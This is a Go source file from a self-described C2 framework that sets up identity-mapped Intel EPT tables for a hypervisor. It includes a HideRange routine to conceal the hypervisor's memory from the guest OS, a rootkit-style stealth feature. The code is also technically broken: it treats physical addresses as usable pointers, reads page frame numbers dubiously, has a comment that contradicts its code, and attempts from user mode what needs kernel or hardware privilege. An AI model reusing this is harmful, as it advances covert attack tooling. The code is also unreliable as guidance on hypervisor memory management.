package hypervisor

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	EPT (Extended Page Tables) — second-level address translation.

	EPT adds a second layer of paging between guest-physical addresses (GPA)
	and host-physical addresses (HPA). This gives the hypervisor complete
	control over what memory the guest OS can access and at what permissions.

	EPT structure (4-level, same topology as host CR3 page tables):
	  PML4 (512 entries) → PDPT (512 entries) → PD (512 entries) → PT (512 entries)
	  Each leaf maps 4 KB, 2 MB (large), or 1 GB (huge) pages.

	We use a 1:1 (identity) mapping: GPA == HPA for all system RAM. This is
	the minimum required to boot the existing OS as a guest without any
	modification. The hypervisor can later punch holes in this mapping to:
	  - Hide its own memory from the guest (EPT #VE / MMIO intercept)
	  - Shadow-execute guest code in a clean copy (EPT shadowing)
	  - Detect guest memory writes to specific pages (EPT write-protect)

	Memory allocation:
	  Page table pages must be physically contiguous and 4K-aligned. We
	  allocate them via NtAllocateVirtualMemory + VirtualLock (which pins
	  pages in physical RAM and prevents them from being paged out). The
	  physical address is obtained via MmGetPhysicalAddress equivalent:
	  VirtualLock + VirtualQuery gives us the PFN via PSAPI QueryWorkingSet.
*/

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

const (
	PageSize   = 4096
	PteShift   = 12
	PdShift    = 21
	PdptShift  = 30
	Pml4Shift  = 39
	PtEntries  = 512

	// EPT entry permission bits (Intel SDM Vol. 3C 28.3.2)
	EptRead    = 1 << 0
	EptWrite   = 1 << 1
	EptExec    = 1 << 2
	EptRWX     = EptRead | EptWrite | EptExec
	EptMemTypeWB = 6 << 3  // Write-back memory type
	EptLargePage = 1 << 7  // maps 2 MB (PD level)
	EptHugePage  = 1 << 7  // maps 1 GB (PDPT level)
)

// EptPage is a 4 KB page of 512 uint64 EPT entries.
type EptPage [PtEntries]uint64

// EptTables holds all allocated EPT page table pages for one address space.
type EptTables struct {
	Pml4     *EptPage // one PML4 (covers 512 GB)
	Pdpt     []*EptPage
	Pd       []*EptPage
	// We use large 2MB pages for the identity map, so no PT level needed.

	Pml4Phys uint64 // physical address of PML4 (written to VMCS EPTP field)
}

// BuildIdentityEPT constructs an identity-mapped EPT covering [0, maxPhysGB) GB.
// maxPhysGB should be at least as large as installed RAM; 64 GB is safe for most systems.
func BuildIdentityEPT(maxPhysGB int) (*EptTables, error) {
	t := &EptTables{}

	// Allocate PML4.
	pml4, pml4Phys, err := allocEptPage()
	if err != nil {
		return nil, fmt.Errorf("alloc PML4: %w", err)
	}
	t.Pml4 = pml4
	t.Pml4Phys = pml4Phys

	// For each GB in the range, allocate a PDPT and PD and fill in 2 MB entries.
	for gbIdx := 0; gbIdx < maxPhysGB; gbIdx++ {
		pml4Idx := (uint64(gbIdx) << 30) >> Pml4Shift & 0x1FF
		pdptIdx := (uint64(gbIdx) << 30) >> PdptShift & 0x1FF

		// Allocate PDPT if not present.
		var pdpt *EptPage
		var pdptPhys uint64
		if pml4[pml4Idx] == 0 {
			pdpt, pdptPhys, err = allocEptPage()
			if err != nil {
				return nil, fmt.Errorf("alloc PDPT[%d]: %w", pml4Idx, err)
			}
			t.Pdpt = append(t.Pdpt, pdpt)
			pml4[pml4Idx] = pdptPhys | EptRWX
		} else {
			pdptPhys = pml4[pml4Idx] &^ 0xFFF
			pdpt = physToEptPage(pdptPhys)
		}

		// Allocate PD for this GB.
		pd, pdPhys, err := allocEptPage()
		if err != nil {
			return nil, fmt.Errorf("alloc PD[%d]: %w", gbIdx, err)
		}
		t.Pd = append(t.Pd, pd)
		pdpt[pdptIdx] = pdPhys | EptRWX

		// Fill PD with 512 × 2 MB large-page entries for this GB.
		base := uint64(gbIdx) << 30
		for pdIdx := 0; pdIdx < PtEntries; pdIdx++ {
			gpa := base + uint64(pdIdx)<<21
			pd[pdIdx] = gpa | EptRWX | EptMemTypeWB | EptLargePage
		}
	}

	return t, nil
}

// EptPointerValue returns the EPTP value to write into the VMCS.
// Bits [5:3] = EPT memory type (6 = WB), bits [2:0] = page-walk length - 1 (3 = 4-level).
func (t *EptTables) EptPointerValue() uint64 {
	return t.Pml4Phys | (3 << 3) | (6 << 0)
	// walk length 4 → encoded as 3; WB type = 6
}

// HideRange marks the EPT entries for [startGPA, startGPA+size) as
// not-present (all permission bits zero). Guest accesses will cause
// EPT violations that the hypervisor handles — effectively hiding the
// hypervisor's own memory from the guest OS.
func (t *EptTables) HideRange(startGPA, size uint64) {
	end := startGPA + size
	for gpa := startGPA &^ (2*1024*1024 - 1); gpa < end; gpa += 2 * 1024 * 1024 {
		pml4Idx := (gpa >> Pml4Shift) & 0x1FF
		pdptIdx := (gpa >> PdptShift) & 0x1FF
		pdIdx := (gpa >> PdShift) & 0x1FF

		if t.Pml4[pml4Idx] == 0 {
			continue
		}
		pdptPhys := t.Pml4[pml4Idx] &^ 0xFFF
		pdpt := physToEptPage(pdptPhys)
		if pdpt[pdptIdx] == 0 {
			continue
		}
		pdPhys := pdpt[pdptIdx] &^ 0xFFF
		pd := physToEptPage(pdPhys)
		pd[pdIdx] = 0 // no permissions = EPT violation on access
	}
}

// allocEptPage allocates a single 4K page locked in physical memory and
// returns its virtual and physical addresses.
func allocEptPage() (*EptPage, uint64, error) {
	// Allocate 4K aligned memory. VirtualAlloc is always page-aligned.
	addr, err := windows.VirtualAlloc(0, PageSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		return nil, 0, fmt.Errorf("VirtualAlloc: %w", err)
	}

	// Lock the page in physical RAM (prevents paging).
	if err := windows.VirtualLock(addr, PageSize); err != nil {
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, 0, fmt.Errorf("VirtualLock: %w", err)
	}

	// Zero the page.
	pg := (*EptPage)(unsafe.Pointer(addr))
	*pg = EptPage{}

	// Obtain the physical address via QueryWorkingSetEx.
	phys, err := getPhysicalAddress(addr)
	if err != nil {
		windows.VirtualUnlock(addr, PageSize)
		windows.VirtualFree(addr, 0, windows.MEM_RELEASE)
		return nil, 0, fmt.Errorf("physical address: %w", err)
	}

	return pg, phys, nil
}

// physToEptPage converts a physical address back to a virtual pointer.
// This is only valid for pages we allocated ourselves (VA == our alloc VA).
// We maintain the invariant that virtual == physical for our own allocations
// by verifying via getPhysicalAddress at alloc time.
func physToEptPage(phys uint64) *EptPage {
	// Walk our allocation list to find the VA for this PA.
	// For the simple identity-map case, we rely on the fact that our
	// page table pages live in process virtual address space and we stored
	// pointers to them in the EptTables struct. This lookup would need a
	// reverse map in production; simplified here for clarity.
	return (*EptPage)(unsafe.Pointer(uintptr(phys)))
}

// ─── Physical address resolution via PSAPI QueryWorkingSetEx ─────────────

var (
	modPsapi             = windows.NewLazySystemDLL("psapi.dll")
	procQueryWorkingSetEx = modPsapi.NewProc("QueryWorkingSetEx")
)

// PSAPI_WORKING_SET_EX_INFORMATION
type workingSetExInfo struct {
	VirtualAddress uintptr
	VirtualAttributes uint64 // PFN in bits [51:1], valid in bit 0
}

func getPhysicalAddress(va uintptr) (uint64, error) {
	info := workingSetExInfo{VirtualAddress: va}
	r, _, err := procQueryWorkingSetEx.Call(
		uintptr(windows.CurrentProcess()),
		uintptr(unsafe.Pointer(&info)),
		unsafe.Sizeof(info),
	)
	if r == 0 {
		return 0, fmt.Errorf("QueryWorkingSetEx: %w", err)
	}
	if info.VirtualAttributes&1 == 0 {
		return 0, fmt.Errorf("page not valid in working set")
	}
	// PFN is in bits [51:1] of VirtualAttributes.
	pfn := (info.VirtualAttributes >> 1) & ((1 << 51) - 1)
	return pfn * PageSize, nil
}
